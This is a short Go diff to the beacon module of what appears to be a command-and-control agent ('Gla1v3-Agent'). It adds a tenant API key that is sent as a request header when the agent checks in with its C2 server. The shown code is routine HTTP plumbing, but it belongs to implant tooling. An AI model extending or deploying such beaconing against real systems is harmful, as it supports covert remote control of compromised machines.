@@ -11,11 +11,12 @@ import (
 
 // Beacon handles the beaconing loop to C2 server
 type Beacon struct {
-	agentID  string
-	c2URL    string
-	interval time.Duration
-	client   *http.Client
-	seq      int
+	agentID      string
+	c2URL        string
+	interval     time.Duration
+	client       *http.Client
+	seq          int
+	tenantAPIKey string
 }
 
 // New creates a new beacon instance
@@ -26,6 +27,18 @@ func New(agentID, c2URL string, interval time.Duration, client *http.Client) *Be
 		interval: interval,
 		client:   client,
 		seq:      0,
+	}
+}
+
+// NewWithTenant creates a new beacon instance with tenant API key
+func NewWithTenant(agentID, c2URL, tenantAPIKey string, interval time.Duration, client *http.Client) *Beacon {
+	return &Beacon{
+		agentID:      agentID,
+		c2URL:        c2URL,
+		interval:     interval,
+		client:       client,
+		seq:          0,
+		tenantAPIKey: tenantAPIKey,
 	}
 }
 
@@ -86,6 +99,11 @@ func (b *Beacon) Send(output, errStr string, extra map[string]interface{}) (*Res
 	req.Header.Set("User-Agent", "Gla1v3-Agent/0.1")
 	req.Header.Set("Content-Type", "application/json")
 	req.Header.Set("X-Agent-ID", b.agentID)
+	
+	// Send tenant API key if available
+	if b.tenantAPIKey != "" {
+		req.Header.Set("X-Tenant-API-Key", b.tenantAPIKey)
+	}
 	
 	resp, err := b.client.Do(req)
 	if err != nil {
